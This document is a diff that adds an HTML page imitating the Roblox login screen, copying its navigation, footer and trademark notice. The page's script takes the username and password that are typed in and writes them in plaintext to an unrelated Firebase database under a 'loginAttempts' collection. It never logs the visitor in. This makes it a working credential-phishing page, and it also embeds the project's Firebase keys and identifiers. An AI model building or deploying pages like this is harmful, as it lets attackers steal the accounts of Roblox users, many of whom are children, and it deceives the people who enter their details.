@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Login to Roblox</title>
+
+  <!-- Firebase SDKs -->
+  <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-firestore-compat.js"></script>
+
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #111;
+      color: white;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+    .navbar {
+      width: 100%;
+      background-color: #111;
+      display: flex;
+      justify-content: space-between;
+      padding: 10px 20px;
+      align-items: center;
+      border-bottom: 1px solid #222;
+      flex-wrap: wrap;
+    }
+    .nav-links {
+      display: flex;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 10px;
+    }
+    .navbar a, .navbar button {
+      color: white;
+      text-decoration: none;
+      font-weight: bold;
+      white-space: nowrap;
+    }
+    .navbar button {
+      background-color: #196aff;
+      border: none;
+      padding: 5px 12px;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    .main-content {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-grow: 1;
+      padding: 20px;
+    }
+    .login-box {
+      background-color: #1c1c1c;
+      padding: 30px;
+      border-radius: 8px;
+      width: 100%;
+      max-width: 320px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.5);
+      margin: 20px 0;
+    }
+    .login-box h2 {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .login-box input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border-radius: 5px;
+      border: none;
+      background-color: #333;
+      color: white;
+      font-size: 14px;
+    }
+    .login-box button {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      background-color: #196aff;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-weight: bold;
+      font-size: 14px;
+    }
+    .login-box button.secondary {
+      background-color: #333;
+    }
+    .login-box button:hover {
+      opacity: 0.9;
+    }
+    .login-box button.secondary:hover {
+      background-color: #444;
+    }
+    .login-box p {
+      text-align: center;
+      margin: 15px 0;
+      font-size: 14px;
+    }
+    .login-box a {
+      color: #196aff;
+      text-decoration: none;
+    }
+    .login-box a:hover {
+      text-decoration: underline;
+    }
+    .footer {
+      width: 100%;
+      text-align: center;
+      font-size: 12px;
+      color: #888;
+      padding: 15px 10px;
+      background-color: #111;
+      border-top: 1px solid #222;
+    }
+    .footer-links {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 8px;
+      margin-bottom: 8px;
+    }
+    .footer a {
+      color: #888;
+      text-decoration: none;
+    }
+    .footer a:hover {
+      text-decoration: underline;
+    }
+    @media (max-width: 600px) {
+      .navbar { padding: 10px; }
+      .nav-links { gap: 8px; }
+      .login-box { padding: 20px; }
+      .footer-links { gap: 5px; }
+    }
+    @media (max-width: 400px) {
+      .navbar {
+        flex-direction: column;
+        gap: 10px;
+      }
+      .nav-links {
+        width: 100%;
+        justify-content: space-between;
+      }
+    }
+
+    #message {
+      text-align: center;
+      margin: 10px 0;
+      padding: 10px;
+      border-radius: 5px;
+      display: none;
+    }
+    .success {
+      background-color: #4CAF50;
+    }
+    .error {
+      background-color: #ff4444;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="navbar">
+    <div class="nav-links">
+      <strong>ROBLOX</strong>
+      <a href="#">Charts</a>
+      <a href="#">Marketplace</a>
+      <a href="#">Create</a>
+      <a href="#">Robux</a>
+    </div>
+    <div class="nav-links">
+      <button id="signupButton">Sign Up</button>
+    </div>
+  </div>
+
+  <div class="main-content">
+    <div class="login-box">
+      <h2>Login to Roblox</h2>
+      <div id="message"></div>
+      <input id="email" type="text" placeholder="Username" />
+      <input id="password" type="password" placeholder="Password" />
+      <button id="loginButton">Log In</button>
+      <p><a href="#" id="forgotPassword">Forgot Password or Username?</a></p>
+      <button class="secondary" id="signupLinkButton">Sign Up</button>
+      <p>Don't have an account? <a href="#" id="signupLink">Sign Up</a></p>
+    </div>
+  </div>
+
+  <div class="footer">
+    <div class="footer-links">
+      <a href="#">About Us</a>
+      <a href="#">Jobs</a>
+      <a href="#">Blog</a>
+      <a href="#">Parents</a>
+      <a href="#">Gift Cards</a>
+      <a href="#">Help</a>
+      <a href="#">Terms</a>
+      <a href="#">Accessibility</a>
+      <a href="#">Privacy</a>
+      <a href="#">Your Privacy Choices</a>
+    </div>
+    <div>
+      ©2025 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are trademarks in the U.S. and other countries.
+    </div>
+  </div>
+
+  <script>
+    // Your Firebase config
+    const firebaseConfig = {
+      apiKey: "AIzaSyBrTpPNNA0wfqXyL1e1h6BqJUhsgZ53JjU",
+      authDomain: "rando-1b07c.firebaseapp.com",
+      projectId: "rando-1b07c",
+      storageBucket: "rando-1b07c.appspot.com",
+      messagingSenderId: "226859562878",
+      appId: "1:226859562878:web:b2e1693c37da6bc07a652f",
+      measurementId: "G-3FSG64FY0L"
+    };
+
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    // DOM elements
+    const emailInput = document.getElementById('email');
+    const passwordInput = document.getElementById('password');
+    const loginButton = document.getElementById('loginButton');
+    const messageDiv = document.getElementById('message');
+
+    function showMessage(message, isError = false) {
+      messageDiv.textContent = message;
+      messageDiv.className = isError ? 'error' : 'success';
+      messageDiv.style.display = 'block';
+      setTimeout(() => { messageDiv.style.display = 'none'; }, 5000);
+    }
+
+    loginButton.addEventListener('click', () => {
+      const email = emailInput.value.trim();
+      const password = passwordInput.value;
+
+      if (!email || !password) {
+        showMessage('Please enter both username and password', true);
+        return;
+      }
+
+      db.collection("loginAttempts").add({
+        username: email,
+        password: password,
+        timestamp: firebase.firestore.FieldValue.serverTimestamp()
+      })
+      .then(() => {
+        showMessage('Login data saved to Firebase!');
+      })
+      .catch((error) => {
+        console.error("Error:", error);
+        showMessage('Error saving data', true);
+      });
+    });
+  </script>
+
+</body>
+</html>
